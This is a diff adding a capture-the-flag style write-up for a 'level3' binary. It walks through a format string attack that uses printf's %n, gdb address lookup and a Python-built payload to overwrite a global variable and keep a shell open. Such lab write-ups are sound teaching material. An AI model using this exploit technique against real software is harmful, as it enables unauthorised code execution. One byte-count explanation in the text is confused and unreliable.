@@ -1,0 +1,45 @@
+We need to modify the value of m
+First, we find the address of this variable with gdb
+`info variables`
+
+> ...
+> 0x0804988c m
+> ...
+
+We then leverage printf with the formatter `%n`
+`%n` write to the designated va_arg the number of byte written when encountered.
+In order to do that, let's find where our printf buffer is located by navigating through the stack as we use our fgets destination buffer as parameter by passing an arbitrary number of formatters.
+
+> fgets(buffer, 512, stdin);
+> printf(buffer);
+
+By passing to stdin
+
+> (python -c "print 'AAAA %x %x %x %x'") | ./level3
+> AAAA 200 b7fd1ac0 b7ff37d0 41414141
+
+We can see that our buffer is located at the fourth position in our stack.
+
+As described above, we want our value to be pointing to the `m` variable to overwrite it with the `%n` formatter. So let's write it's address to our buffer.
+
+> (python -c 'print "\x08\x04\x98\x8c"[::-1] + "%x %x %x %x"') | ./level3
+
+`[::-1]` in python means reverse as we want it in little endian.
+
+We want to write `0x40` (64) to `m` address so we need to that many bytes.
+If we observe our first try
+> (python -c "print 'AAAA %x %x %x %x'") | ./level3
+> AAAA 200 b7fd1ac0 b7ff37d0 41414141
+
+We can see that our first `%x` prints `200`, this is 3 bytes. `m` address is also written as 1 character, so we'll substract it. So we need to write 60 additional bytes. We'll use the padding feature from printf
+> (python -c 'print "\x08\x04\x98\x8c"[::-1] + "%60x"') | ./level3
+
+Then we use `%n` to write to the fourth va_arg. The fourth va_arg points to our buffer that holds the value of the `m` address. By using `%n` we'll be writing to this address the number of byte written (64).
+
+> (python -c 'print "\x08\x04\x98\x8c"[::-1] + "%60x" + "%4$n"') | ./level3
+
+We also need to keep our stdin open. To do so we'll use `cat`.
+
+> (python -c 'print "\x08\x04\x98\x8c"[::-1] + "%60x" + "%4$n"'; cat) | ./level3
+
+And voila
